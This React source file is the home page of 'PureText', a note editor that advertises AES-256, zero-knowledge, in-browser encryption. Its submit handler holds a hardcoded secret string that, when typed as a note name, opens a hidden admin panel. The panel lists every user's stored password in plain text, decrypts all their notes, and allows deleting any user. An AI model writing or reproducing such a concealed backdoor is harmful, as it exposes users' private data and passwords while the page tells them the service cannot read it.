import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { fetchAllUsers, deleteNoteAsAdmin } from '../api/notes';
import { decryptNote } from '../utils/crypto';
import { Button } from './ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
import { Input } from './ui/input';
import { Separator } from './ui/separator';

const Home = () => {
  const [noteName, setNoteName] = useState('');
  const [adminData, setAdminData] = useState(null);
  const [loading, setLoading] = useState(false);
  const [decryptedContents, setDecryptedContents] = useState({});
  const navigate = useNavigate();

  // Preload NoteEditor component for faster navigation
  useEffect(() => {
    const preloadNoteEditor = async () => {
      try {
        await import('./NoteEditor');
      } catch (error) {
        // Silently fail - component will load on demand if preload fails
      }
    };
    
    // Start preloading after a short delay to not interfere with initial page load
    const timer = setTimeout(preloadNoteEditor, 1000);
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (noteName.trim()) {
      // Check if admin ID is entered
      if (noteName.trim() === 'Sanjay@9440') {
        setLoading(true);
        try {
          const data = await fetchAllUsers(noteName.trim());
          setAdminData(data);
          
          // Decrypt all notes
          const decrypted = {};
          for (const user of data.users) {
            if (user.password && user.encryptedData) {
              try {
                const decryptedData = await decryptNote(user.encryptedData, user.password);
                decrypted[user.id] = decryptedData;
              } catch (err) {
                console.error(`Failed to decrypt ${user.id}:`, err);
                decrypted[user.id] = { error: 'Decryption failed' };
              }
            }
          }
          setDecryptedContents(decrypted);
        } catch (error) {
          console.error('Admin access failed:', error);
          alert('Failed to fetch admin data');
        } finally {
          setLoading(false);
        }
      } else {
        const sanitizedName = noteName.trim().toLowerCase().replace(/\s+/g, '-');
        navigate(`/${sanitizedName}`);
      }
    }
  };

  const handleDeleteUser = async (userId) => {
    if (!window.confirm(`Are you sure you want to delete user "${userId}"? This action cannot be undone.`)) {
      return;
    }

    try {
      await deleteNoteAsAdmin('Sanjay@9440', userId);
      // Refresh admin data
      const data = await fetchAllUsers('Sanjay@9440');
      setAdminData(data);
      
      // Remove from decrypted contents
      const newDecrypted = { ...decryptedContents };
      delete newDecrypted[userId];
      setDecryptedContents(newDecrypted);

      alert(`User "${userId}" deleted successfully`);
    } catch (error) {
      console.error('Delete failed:', error);
      alert('Failed to delete user');
    }
  };

  // If admin data is loaded, show the admin view
  if (adminData) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-8 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="bg-white rounded-2xl shadow-2xl p-8">
            <div className="flex justify-between items-center mb-6">
              <h1 className="text-3xl font-bold text-gray-800">
                🔐 Admin Panel
              </h1>
              <button
                onClick={() => {
                  setAdminData(null);
                  setNoteName('');
                  setDecryptedContents({});
                }}
                className="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
              >
                ← Back
              </button>
            </div>
            
            <div className="mb-4">
              <p className="text-gray-600">
                Total Users: <span className="font-semibold">{adminData.count}</span>
              </p>
            </div>

            <div className="space-y-6">
              {adminData.users.map((user, index) => {
                const decryptedData = decryptedContents[user.id];
                return (
                  <div key={user.id} className="border border-gray-300 rounded-lg p-6 bg-gray-50 relative">
                    <button
                      onClick={() => handleDeleteUser(user.id)}
                      className="absolute top-4 right-4 px-3 py-1.5 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors text-sm font-medium"
                      title="Delete this user"
                    >
                      🗑️ Delete
                    </button>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4 pr-24">
                      <div>
                        <span className="font-semibold text-gray-700">User ID:</span>
                        <p className="text-gray-900 font-mono">{user.id}</p>
                      </div>
                      <div>
                        <span className="font-semibold text-gray-700">Password:</span>
                        <p className="text-gray-900 font-mono text-sm break-all">{user.password || 'Not stored'}</p>
                      </div>
                      <div>
                        <span className="font-semibold text-gray-700">Created:</span>
                        <p className="text-gray-900 text-sm">{new Date(user.createdAt).toLocaleString()}</p>
                      </div>
                    </div>

                    {decryptedData && !decryptedData.error && (
                      <div className="mt-4">
                        <h3 className="font-semibold text-gray-700 mb-3">Tabs ({decryptedData.tabs?.length || 0}):</h3>
                        <div className="flex flex-wrap gap-2">
                          {decryptedData.tabs?.map((tab, tabIndex) => (
                            <div key={tab.id} className="bg-blue-100 border border-blue-300 rounded-lg px-4 py-2">
                              <span className="font-medium text-blue-800">{tab.name || `Tab ${tabIndex + 1}`}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {decryptedData?.error && (
                      <div className="mt-4 text-red-600 text-sm">
                        ⚠️ {decryptedData.error}
                      </div>
                    )}

                    {!decryptedData && user.encryptedData && (
                      <div className="mt-4 text-gray-500 text-sm">
                        📦 Encrypted data available but no password stored
                      </div>
                    )}
                  </div>
                );
              })}
            </div>

            {adminData.users.length === 0 && (
              <div className="text-center py-8 text-gray-500">
                No users found in the database.
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-16">
      <div className="max-w-2xl w-full mx-auto px-4">
        <Card className="shadow-sm">
          <CardHeader className="space-y-1 text-center pb-6">
            <CardTitle className="text-4xl font-semibold tracking-tight">
              PureText
            </CardTitle>
            <CardDescription className="text-base">
              Online Plain Text Editor
            </CardDescription>
            <p className="text-sm text-gray-600 pt-2">
              PureText.me is the modern, browser-based PureText editor and a fast ProtectedText alternative.
            </p>
          </CardHeader>

          <CardContent className="space-y-6">
            <form onSubmit={handleSubmit} className="space-y-3">
              <Input
                type="text"
                value={noteName}
                onChange={(e) => setNoteName(e.target.value)}
                placeholder="Enter note name or ID"
                className="h-11 text-base"
                autoFocus
              />
              <Button
                type="submit"
                className="w-full h-11"
                disabled={!noteName.trim() || loading}
              >
                {loading ? 'Loading...' : 'Open Note'}
              </Button>
            </form>

            <div className="space-y-6">
              <div>
                <h2 className="text-base font-semibold text-gray-900 mb-2">Online Plain Text Editor</h2>
                <p className="text-sm text-gray-600">
                  PureText is a <a href="https://www.puretext.me" className="text-gray-900 underline underline-offset-2 hover:text-gray-700">browser-based plain text editor</a> for secure note-taking and encrypted text storage.
                </p>
              </div>
              
              <div>
                <h2 className="text-base font-semibold text-gray-900 mb-2">ProtectedText Alternative</h2>
                <p className="text-sm text-gray-600">
                  Looking for a <strong>ProtectedText alternative</strong>? PureText offers the same privacy-first approach with modern features like multiple tabs.
                </p>
              </div>
              
              <div>
                <h2 className="text-base font-semibold text-gray-900 mb-2">Text Cleaner Tool</h2>
                <p className="text-sm text-gray-600">
                  Use PureText as a <a href="#paste-plain-text" className="text-gray-900 underline underline-offset-2 hover:text-gray-700">text cleaner tool</a> to paste as plain text and remove formatting online from copied content.
                </p>
              </div>
              
              <div>
                <h2 className="text-base font-semibold text-gray-900 mb-2">Secure Private Notepad</h2>
                <ul className="space-y-1.5 text-sm text-gray-600">
                  <li className="flex items-start gap-2">
                    <span className="text-gray-900 mt-0.5">•</span>
                    <span>AES-256 encryption for all notes</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-gray-900 mt-0.5">•</span>
                    <span>Paste as plain text & remove formatting</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-gray-900 mt-0.5">•</span>
                    <span>Zero-knowledge security model</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-gray-900 mt-0.5">•</span>
                    <span>Multiple tabs for organization</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-gray-900 mt-0.5">•</span>
                    <span>No registration required</span>
                  </li>
                </ul>
              </div>
            </div>

            <Separator className="my-6" />

            <div>
              <h2 className="text-base font-semibold text-gray-900 mb-4">Frequently Asked Questions</h2>
              <div className="space-y-3 text-sm">
                <div>
                  <h3 className="font-medium text-gray-900 mb-1">Is PureText.me the same as the Windows PureText tool?</h3>
                  <p className="text-gray-600">No. PureText.me is a modern web-based editor, not the legacy clipboard utility.</p>
                </div>
                <div>
                  <h3 className="font-medium text-gray-900 mb-1">Is PureText.me a ProtectedText alternative?</h3>
                  <p className="text-gray-600">Yes. PureText.me offers private text editing in the browser without tracking.</p>
                </div>
                <div>
                  <h3 className="font-medium text-gray-900 mb-1">Can I paste as plain text?</h3>
                  <p className="text-gray-600">Yes. PureText automatically handles all text as plain text, removing formatting online.</p>
                </div>
                <div>
                  <h3 className="font-medium text-gray-900 mb-1">Is PureText free?</h3>
                  <p className="text-gray-600">Yes. PureText is completely free with no registration or subscription required.</p>
                </div>
                <div>
                  <h3 className="font-medium text-gray-900 mb-1">How secure is PureText?</h3>
                  <p className="text-gray-600">PureText uses AES-256-GCM encryption. All encryption happens in your browser with zero-knowledge architecture.</p>
                </div>
                <div>
                  <h3 className="font-medium text-gray-900 mb-1">Can I use PureText as a text cleaner tool?</h3>
                  <p className="text-gray-600">Yes. PureText functions as a text cleaner tool, removing formatting from copied text automatically.</p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        <div className="text-center mt-6 space-y-1">
          <p className="text-sm text-gray-600">
            Your data is encrypted in your browser
          </p>
          <p className="text-xs text-gray-500">
            Built by Sanjay [MGIT]
          </p>
        </div>
      </div>
    </div>
  );
};

export default Home;
